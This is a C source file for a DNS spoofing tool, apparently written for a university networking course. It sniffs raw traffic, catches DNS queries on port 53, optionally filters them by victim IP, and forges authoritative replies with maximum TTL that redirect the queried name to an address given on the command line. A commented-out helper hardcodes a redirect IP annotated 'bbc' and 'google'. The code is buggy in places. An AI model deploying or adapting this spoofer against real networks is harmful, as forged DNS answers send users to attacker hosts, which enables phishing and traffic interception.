
/******************** DNS SPOOFING **********************


********************************************************/

#include "node.h"

/**
	Fill the DNS header and fill the answer and question part
*/
int pack_dns_header(struct dnsPacket *dnspart, struct dnshdr *ptr) {
	
	//memset will set all the fields to zero since most of the fiels are zero
	memset(ptr,0,sizeof(struct dnshdr));
	//header id, flag bits
	ptr->xid = dnspart->dns_hdr.xid;	
	ptr->qr = 1;
	ptr->aa = 1;
	ptr->num_questions = htons(1);
	ptr->num_answers = htons(1);
	
	return 0;
}

// forms the spoofed dns packet
struct send_dns *craft_dns_hack(char *buffer, uint32_t red) {
	
	uint16_t type = htons(1);
	uint32_t ttl = htonl(MAX_TTL);
	uint16_t len = htons(4);

	//get the dns part of the packet received
	struct dnsPacket *dnspart = (struct dnshdr *) (buffer+ETH_HS+IP_HS+UDP_HS);
	
	char *reply_packet = NULL;
	reply_packet = malloc(MAX_UDP);// segfaulted here ... done

	struct dns_answer_section answer;
	memset(&answer,0,sizeof(struct dns_answer_section));
	
	struct dnshdr header;
	int ret = pack_dns_header(dnspart, &header);
	
	//cpy the DNS header to the reply packet
	memcpy(reply_packet, &header, sizeof(header));
	
	char *counter = (char *)&dnspart->dns_qus;
	
	/************* Change *********************/
	//THIS part I got helped from Vm4 (cs168 student and my roommate)
	int i = 0;
	while (*(uint8_t *)counter) {
		uint8_t size = *(uint8_t *)counter;
    		counter += (size + 1);
    		i  += (size + 1);
    	}
    	i++;
	
    	memcpy(reply_packet+DNS_HS, &dnspart->dns_qus, i);
    	memcpy(reply_packet+DNS_HS+i, counter+1, sizeof(uint16_t));
    	memcpy(reply_packet+DNS_HS+i+2, counter+1 + 2, 2);//??
	/******************************************/
	
    	char *anwPtr = reply_packet + DNS_HS + i + (2*sizeof(uint16_t));
    	memcpy( anwPtr, &dnspart->dns_qus, i );
	memcpy( anwPtr + i, &type, sizeof(uint16_t) );
	memcpy( anwPtr + i + sizeof(uint16_t), &type, sizeof(uint16_t) );
	memcpy( anwPtr + i + 2*sizeof(uint16_t), &ttl, sizeof(uint32_t) );
	memcpy( anwPtr + i + 2*sizeof(uint32_t), &len, sizeof(uint16_t));
	memcpy( anwPtr + i + 5*sizeof(uint16_t), &red, sizeof(uint32_t) );

	int dns_length = DNS_HS + 2*i + 2*(uint16_t) + (3*sizeof(type)) + (2*sizeof(ttl));

	struct send_dns *ready_packet = malloc(sizeof(struct send_dns));
	ready_packet->len = dns_length;
	ready_packet->payload = reply_packet;

	return ready_packet;
	
}

/***************************** pack_frame ********************************

1. makes the ip heaher and udp header + checksum on both
*************************************************************************/
void *pack_frame( char* buffer, struct send_dns *dpacket ) {

	struct iphdr *recvd_ip = (struct iphdr *) (buffer + ETH_HS);

	struct iphdr *iph = calloc( 1, IP_HS);

	iph->ihl  = recvd_ip->ihl;
	iph->version   = recvd_ip->version;
	iph->tos = recvd_ip->tos;
	iph->tot_len = IP_HS + UDP_HS + dpacket->len; // Total packet size
	iph->id  = htons(1111); 
	iph->frag_off = 0;
	iph->ttl = recvd_ip->ttl;
	iph->protocol   = recvd_ip->protocol;
	iph->check = 0; 
	iph->saddr = recvd_ip->daddr;
	iph->daddr = recvd_ip->saddr;
	
	iph->check = ip_sum( (char *) iph, sizeof(struct iphdr) );
	struct udphdr *recvd_udp = (struct udphdr *) (buffer + ETH_HS + IP_HS);
	struct udphdr *udph = calloc(1, UDP_HS);
	udph->source = recvd_udp->dest;
	udph->dest   = recvd_udp->source;
	udph->len    = htons( UDP_HS + dpacket->len );
	udph->check  = 0;

	// Make pseudo header
	struct pseudo_udp p;
	p.sudo_src_ip = iph->saddr;
	p.sudo_dst_ip   = iph->daddr;
	p.sudo_mbz = 0;
	p.sudo_prot = 17;

	p.sudo_udp_len = htons( UDP_HS + dpacket->len );
	int check_size  = sizeof(struct pseudo_udp) + UDP_HS + dpacket->len;
	char *pseudo_buffer = calloc( 1,check_size );

	memcpy( pseudo_buffer, &p, sizeof( struct pseudo_udp ) );
	memcpy( pseudo_buffer + sizeof(struct pseudo_udp), udph, UDP_HS);
	memcpy( pseudo_buffer + sizeof(struct pseudo_udp) + UDP_HS, 
		dpacket->payload, dpacket->len );
	
	udph->check = ip_sum( pseudo_buffer, check_size );
	free(pseudo_buffer);

	void *ret = calloc(1, sizeof(struct iphdr) + UDP_HS + dpacket->len);

	memcpy(ret, iph, IP_HS);
	memcpy(ret + IP_HS, udph, UDP_HS);
	memcpy(ret + IP_HS + UDP_HS, dpacket->payload, dpacket->len);

	free(iph);
	free(udph);
	return ret;
}

int main(int argc, char *argv[]) {


	//test_udp_checksum();
	//check correct usage 
	if(argc < 2){
		printf("usage: dnsspoof redirectDomain requestedDomain\n");
		return EXIT_FAILURE;
	}

	//setup raw socket
	int rawsock = 0, packet_size = 0, on = 1;
	//htons(ETH_P_ALL)
	if((rawsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
		perror("socket()");
		return EXIT_FAILURE;
	}
	//TODO"178.249.136.150"
	uint32_t redirect_to = inet_addr(argv[1]);
	uint32_t filter = NULL;
	if (argc == 3) {
		if (strcmp(argv[2],"*")) {
			filter = inet_addr(argv[2]);
		}
	}
	


	// we will send using this socket
	int sock;
	if ((sock = socket(AF_INET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		perror("socket()");
		return EXIT_FAILURE;	
	}
	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&on, sizeof(int)) < 0){
		printf("header include failed\n");
		return EXIT_FAILURE;
	}

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(80); 
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	printf("socket setup successful\n");

	//for debug inet_ntop 
	char src[INET_ADDRSTRLEN];
	char dest[INET_ADDRSTRLEN];

	//for receiving
	int rx_bytes;
	char buffer[UDP_RECV_SIZE];
	char sendBuff[MAX_UDP]; 
	char *domain_name = NULL;
	struct sockaddr_in clientaddr;
	int addrlen = sizeof(struct sockaddr_in);
	struct dns_question_section *query_info = NULL;

	//receive-inspect-act loop
	for (;;){

		//receive with errcheck on recvfrom()
		if((rx_bytes = recvfrom(rawsock, buffer, UDP_RECV_SIZE, 0,
					(struct sockaddr *) &clientaddr, (socklen_t *) &addrlen)) < 0 ){
			printf("recvfrom() failed\n");
			return EXIT_FAILURE;
		}

		//get the ip header
		struct iphdr *ippart = (struct iphdr *) (buffer+ETH_HS);
		print_ipheader(ippart);

		//IPv4 only
		if (ippart->version != 4) {
			continue;
		}
		// Only UDP acceptable
		if (ippart->protocol != 17) {
			continue;
		}

		// Its UDP, lets get the udp part
		struct udphdr *udppart = (struct udppart *) (buffer+ETH_HS+IP_HS);	
		print_udpheader(udppart);

		// DNS only
		if (ntohs(udppart->dest) != 53) {
			continue;
		}
		
		printf("--------filter %d\n", filter);
		printf("--------ip saddr %d\n", ippart);

		if(filter != NULL){
			if(ippart->saddr != filter){
				continue;		
			}
		}

		struct send_dns *send_dns= craft_dns_hack(buffer, redirect_to);
		
		//Thanks to VM4 (cs168 student/friend)
		void* send_packet = pack_frame( buffer, send_dns);
		
		int bytes_to_send = IP_UDP_HS + send_dns->len;
		int bytes_sent = sendto(sock, send_packet, bytes_to_send, 0, (struct sockaddr*) &addr, sizeof(addr));
		if(bytes_sent <= 0) {
			printf("ERROR : Sendto error\n");
			return -1;
		}
	}
	return 0;
}

char *pack_ip(struct iphdr *h, int tot_size) {

	printf("\n--------------- TEST IP HEADER ------------------\n");
	print_ipheader(h);

	unsigned char *reply_ip_packet = malloc(IP_HS);
	unsigned char *ptr = reply_ip_packet;

	struct iphdr *s = (struct iphdr *)ptr;
	memset(s,0,IP_HS);
	s->version = 4;
	s->ihl = 5;
	s->tot_len = (uint16_t)htons(tot_size);
	s->id = h->id;
	s->frag_off = h->frag_off;
	s->ttl = 64;
	s->protocol = 17;
	s->check = 0;
	s->saddr = h->daddr;
	s->daddr = h->saddr;

	//Checksum
	int sum = ip_sum(reply_ip_packet, IP_HS);
	s->check = sum;

	printf(_BGREEN_"IP PACKET ALL SET"_NORMAL_"\n");

	return reply_ip_packet;

}

char *pack_udp(uint32_t srcip, uint32_t destip, struct udphdr *udppart, char *reply_dns_part, int dns_len) {

	printf("\n--------------- TEST UDP HEADER ------------------\n");
	print_udpheader(udppart);

	char *reply_udp_packet = malloc(UDP_HS);
	struct udphdr *h = (struct udphdr *)reply_udp_packet;
	h->source = (uint16_t)htons(53);
	h->dest = udppart->source;
	h->len = htons(dns_len);

	//CHECKSUM
	unsigned char *sudoHdr = (char *)malloc(sizeof(struct pseudo_udp) + dns_len);
	struct pseudo_udp *t = (struct pseudo_udp *)sudoHdr;
	t->sudo_src_ip = destip;
	t->sudo_dst_ip = srcip;
	t->sudo_mbz = 0;
	t->sudo_prot = 17;
	t->sudo_udp_len = htons(UDP_HS + dns_len);
	//t->udp_src_port = htons(53);
	//t->udp_dest_port = udppart->source;
	//t->udp_len = htons(dns_len);
	//t->udp_check = 0;
	
	memcpy(sudoHdr+sizeof(struct pseudo_udp),reply_dns_part, dns_len);
	uint16_t sum = (uint16_t)ip_sum(sudoHdr, UDP_HS + dns_len);
	h->check = sum;
	printf(_BGREEN_"UDP PACKET ALL SET"_NORMAL_"\n");
	return reply_udp_packet;

}
/*
char *pack_dns(char *question_domain, int sock, struct sockaddr_in *clientaddr, int dns_type, char *request_packet, int request_packet_size, int *dns_len) {

	char *reply_packet = NULL;
	struct dns_answer_section answer;
	memset(&answer,0,sizeof(struct dns_answer_section));

	answer.name = htons(DNS_REPLY_NAME);
	answer.type = htons(dns_type);
	answer.clss= htons(DNS_CLASS_IN);
	answer.ttl_top = 0;
	answer.ttl = htons(DNS_REPLY_TTL);
	answer.data_len = htons(IPV4_ADDR_LEN);

	int reply_packet_size = 0;
	reply_packet_size = request_packet_size + ((sizeof(struct dns_answer_section) + IPV4_ADDR_LEN) * DNS_NUM_ANSWERS);
	reply_packet = malloc(reply_packet_size);

	*dns_len = reply_packet_size; //????
//
	int memcpy_offset = 0;
	in_addr_t ip_address1 = {0};
	in_addr_t ip_address2 = {0};
	ip_address1 = inet_addr("178.249.136.150");//bbc
	ip_address2 = inet_addr("178.249.136.150");//google

	memcpy(reply_packet,request_packet,request_packet_size);

	memcpy_offset += request_packet_size;
	memcpy(reply_packet+memcpy_offset,(void *) &answer, sizeof(struct dns_answer_section));
	memcpy_offset += sizeof(struct dns_answer_section);
	memcpy(reply_packet+memcpy_offset,(void *) &ip_address1,IPV4_ADDR_LEN);
	memcpy_offset += IPV4_ADDR_LEN;
	memcpy(reply_packet+memcpy_offset,(void *) &answer, sizeof(struct dns_answer_section));
	memcpy_offset += sizeof(struct dns_answer_section);
	memcpy(reply_packet+memcpy_offset,(void *) &ip_address2,IPV4_ADDR_LEN);


	/* Change the number of answers and the flags values of the DNS packet header 
	struct dnshdr *header = NULL;
    header = (struct dnshdr *) reply_packet;
    header->num_answers = htons(DNS_NUM_ANSWERS);
    header->flags = htons(DNS_REPLY_FLAGS);

	printf(_BGREEN_"DNS PACKET ALL SET"_NORMAL_"\n");

	printf("\n--------------- REPLY DNS PACKET ---------------------\n");
	print_dns_packet(reply_packet, reply_packet_size, question_domain);

	return reply_packet;

}
*/
char *print_dns_packet(char *packet, int packet_size, int *nameSize){

	printf("\t---DNSHDR:\n");
	struct dnshdr *dnsheader= packet;
	int numq=ntohs(dnsheader->num_questions), numans=ntohs(dnsheader->num_answers),
		numauth=ntohs(dnsheader->num_authority), numadd=ntohs(dnsheader->num_additional);

	//if(numq > 1) return;

  	printf("\t[%d QUS]\n",numq);
	char *dname = NULL, *dname_pointer = packet+DNS_HS, *tmp_ptr = NULL;
	int part_len, dname_len = 0;

	do{
		part_len = (int) dname_pointer[0];
		if((part_len <= 0) || (part_len > (packet_size-DNS_HS))){
			memset(dname+dname_len-1, '\0',sizeof(char));
			break;
		}
		dname_pointer++;

		tmp_ptr = dname;
		dname = realloc(dname, (dname_len+part_len+PERIOD_SIZE+1));
		if(dname == NULL){
			if(tmp_ptr) free(tmp_ptr);
			perror("realloc()");
			return;
		}

		memset(dname+dname_len,0,part_len+PERIOD_SIZE+1);

		strncat(dname, dname_pointer, part_len);
		strncat(dname, PERIOD, PERIOD_SIZE);

		dname_len += part_len + PERIOD_SIZE;
		dname_pointer += part_len;
	} while(part_len > 0);

	*nameSize = dname_len;
	printf("\t name length is %d\n",dname_len);
	struct dns_question_section *question = packet+DNS_HS+dname_len+1;

	printf("\tname %s\n", dname);
	printf("\ttype %d (1 is A)\n", ntohs(question->type));
	printf("\tclass %d (1 is IN)\n",ntohs(question->cls));

	return dname;
}




/* Extract the domain name from the DNS query packet */
char *get_domain_queried(char *dns_packet, int packet_size)
{
	char *domain_name_pointer = NULL;
	char *domain_name = NULL;
	char *tmp_ptr = NULL;
	int dns_header_len = DNS_HS;
	int name_part_len = 0;
	int dn_len = 0;

	if(packet_size > dns_header_len){

		//where domain name starts
		domain_name_pointer = (dns_packet + dns_header_len);
	
		//start processing, "word" by "word"
		do {
			//length of this part of the name
			name_part_len = (int) domain_name_pointer[0];

			/* If the length is zero or invalid, then stop processing the domain name */
			if((name_part_len <= 0) || (name_part_len > (packet_size-dns_header_len))){
				printf("Ignoring : invalid name_part_len \n");
				break;
			}
			
			//length confirmed--move to where the string starts
			domain_name_pointer++;

			/* Reallocate domain_name pointer to name_part_len plus two bytes;
			 * one byte for the period, and one more for the trailing NULL byte.*/
			tmp_ptr = domain_name;
			domain_name = realloc(domain_name,(dn_len+name_part_len+PERIOD_SIZE+1));
			if(domain_name == NULL){
				if(tmp_ptr) free(tmp_ptr);
				perror("Realloc Failure");
				return NULL;
			}
			memset(domain_name+dn_len,0,name_part_len+PERIOD_SIZE+1);
			
			//printf("Domain name successfully reallocated\n");

			/* Concatenate this part of the domain name, plus the period */
			strncat(domain_name,domain_name_pointer,name_part_len);
			strncat(domain_name,PERIOD,PERIOD_SIZE);

			/* Keep track of how big domain_name is, and point 
			 * domain_name_pointer to the next part of the domain name.
			 */
			dn_len += name_part_len + PERIOD_SIZE + 1;
			domain_name_pointer += name_part_len;
		} while(name_part_len > 0);
	}

	return domain_name;
}

int ip_sum(char* packet, int n) {

  uint16_t *p = (uint16_t*)packet;
  uint16_t answer;
  long sum = 0;
  uint16_t odd_byte = 0;

  while (n > 1) {
    sum += *p++;
    n -= 2;
  }
  /* mop up an odd byte, if necessary */
  if (n == 1) {
    *(uint8_t*)(&odd_byte) = *(uint8_t*)p;
    sum += odd_byte;
  }

  sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
  sum += (sum >> 16);           /* add carry */
  answer = ~sum;                /* ones-complement, truncate*/
  return answer;
}

/* Create a server socket */
int create_socket()
{
	int on = 1;
	int sock = 0;

  	if((sock = socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) < 0){
  		printf("Socklib: Failed to create socket\n");
    	return -1;
 	}

	//set reusable 
 	if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(int)) < 0){
	 	printf("Socklib: Failed to set socket option SO_REUSEADDR\n");
	  return -1;
	}

	return sock;
}
// Listen for and receive data from a client connection.
// CONTAINS MALLOC
char *receive(int lsock, int *rx_bytes, struct sockaddr_in *clientaddr)
{
	int recv_size = 0;
	int clen = 0, header_offset = 0;
	int addrlen = sizeof(struct sockaddr_in);
	char *buffer = NULL, *tmp_ptr = NULL, *data_ptr = NULL;
	char *clen_ptr = NULL, *line_end_ptr = NULL;

	*rx_bytes = 0;

	/* Malloc space for the buffer */
	if((buffer = malloc(UDP_RECV_SIZE+1)) == NULL){
  	perror("malloc() failed");
    return NULL;
  }

  memset(buffer,0,UDP_RECV_SIZE+1);

	if((*rx_bytes = recvfrom(lsock,buffer,UDP_RECV_SIZE,0,(struct sockaddr *) clientaddr, (socklen_t *) &addrlen)) < 0){
		printf("recvfrom() failed\n");
		if(buffer) free(buffer);
		return NULL;
	}
		
	/* Return received data */
	return buffer;
}



/* Used to construct the IP header she sent us */
uint32_t decapsulate_fromip (char *packet, struct iphdr **ipheader) {

	char *p = packet;
	struct iphdr *i = *ipheader;
	//uint16_t newchecksum;
	memcpy(i, p, sizeof(uint8_t));
	p=p+sizeof(uint8_t)*2;
	memcpy(&(i->tot_len), p, sizeof(uint16_t));
	i->tot_len = ntohs(i->tot_len);
	p=p+sizeof(uint16_t);

	memcpy(&(i->id), p, sizeof(uint16_t));
	p=p+sizeof(uint16_t);
	memcpy(&(i->frag_off),p, sizeof(uint16_t));
	p=p+sizeof(uint16_t)+sizeof(uint8_t);

	memcpy(&(i->protocol), p, sizeof(uint8_t));
	p=p+sizeof(uint8_t); 

	memcpy(&(i->check), p, sizeof(uint16_t));
	memset(p,0,sizeof(uint16_t));

	p=p+sizeof(uint16_t);
	memcpy(&(i->saddr), p, sizeof(uint32_t));
	p=p+sizeof(uint32_t);
	memcpy(&(i->daddr), p, sizeof(uint32_t));

	char src[INET_ADDRSTRLEN];
	char dest[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, ((struct in_addr *)&(i->saddr)), src, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, ((struct in_addr *)&(i->daddr)), dest, INET_ADDRSTRLEN);

	return i->daddr;
}


void print_udpheader(struct udphdr *udp, int way) {

	if (way == 1) {
		//printf(_BCYAN_"\n-------------- Receiving UDP Header -------------"_NORMAL_"\n");
	} else {
		//printf(_BCYAN_"\n-------------- Sending UDP Header -------------"_NORMAL_"\n");
	}
	printf("UDP src_port=%d dst_port=%d length=%d checksum=%x\n\n",
				ntohs(udp->source),
				ntohs(udp->dest),
				ntohs(udp->len),
				ntohs(udp->check));
}

void print_ipheader(struct iphdr *i) {

	char src[INET_ADDRSTRLEN];
	char dest[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, ((struct in_addr *)&(i->saddr)), src, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, ((struct in_addr *)&(i->daddr)), dest, INET_ADDRSTRLEN);
	printf("vsion:%hd\t hlen:%hd\t len:%d\t id: %d\t foff %d\t ptcl: %hd\t sum: %x\t source: %s\t destination: %s\n",i->version,i->ihl,ntohs(i->tot_len),i->id,i->frag_off,i->protocol,i->check,src,dest);
		
}
